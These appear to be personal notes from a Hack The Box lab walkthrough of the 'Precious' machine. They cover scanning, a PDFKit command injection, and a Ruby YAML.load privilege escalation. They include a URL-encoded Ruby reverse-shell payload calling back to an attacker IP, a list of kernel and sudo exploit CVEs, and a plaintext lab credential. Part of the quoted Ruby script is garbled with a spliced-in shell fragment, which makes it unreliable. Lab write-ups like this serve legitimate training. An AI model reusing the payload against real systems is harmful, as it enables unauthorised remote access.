nmap -p- --min-rate 10000 precious.htb
80/tcp open  http    nginx 1.18.0

X-Runtime: Ruby

found inside pdf strings  
![[Pasted image 20221127015827.png]]
vulnerable to RCE
https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795

![[Pasted image 20221127015854.png]]
![[Pasted image 20221127015859.png]]
generated a ruby shell because i know that ruby is on the machine 
![[Pasted image 20221127031648.png]]
and we got a shell
![[Pasted image 20221127031705.png]]

![[Pasted image 20221127031939.png]]
Potentially Vulnerable to CVE-2022-0847                                                                                       
  
Potentially Vulnerable to CVE-2022-2588  
```
http%3A%2F%2FPDFKit.new%28%22http%2520%60ruby%20-rsocket%20-e'spawn(%22sh%22,%5B:in,:out,:err%5D=%3ETCPSocket.new(%2210.10.16.10%22,4444))'%60%22%29.to_pdf+
```

sudo Baron Samedit  [CVE-2021-3156] 
[CVE-2022-2586] nft_object UAF
[CVE-2021-3156] sudo Baron Samedit 2
[CVE-2021-22555] Netfilter heap out-of-bounds write 
KBXfcQcQruby


ub   dsa3072 2022-06-26 [SCA]
      7C6786A7561BC84F5048671E387775C35745D203
uid           [ unknown] Passpie (Auto-generated by Passpie) <passpie@local>
sub   elg1024 2022-06-26 [E]
inside ruby directory found .bundle that has henry creds
![[Pasted image 20221127061327.png]]
![[Pasted image 20221127061343.png]]
henry:Q3c1AqGHtoI0aXAYFH

```ruby

# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.n>
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |hbd:["/bin/sh","-c"]|
  , file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file:>
            else
                puts "Installed version is equals to the one specified in file:>
            end
        end
    end
end


```
user henry can run sudo with ruby to use /opt/update_dependencies
and we can create that file and run our program inside
found a exploit for YAML.load function that can lead to RCE
https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/
![[Pasted image 20221127161644.png]]
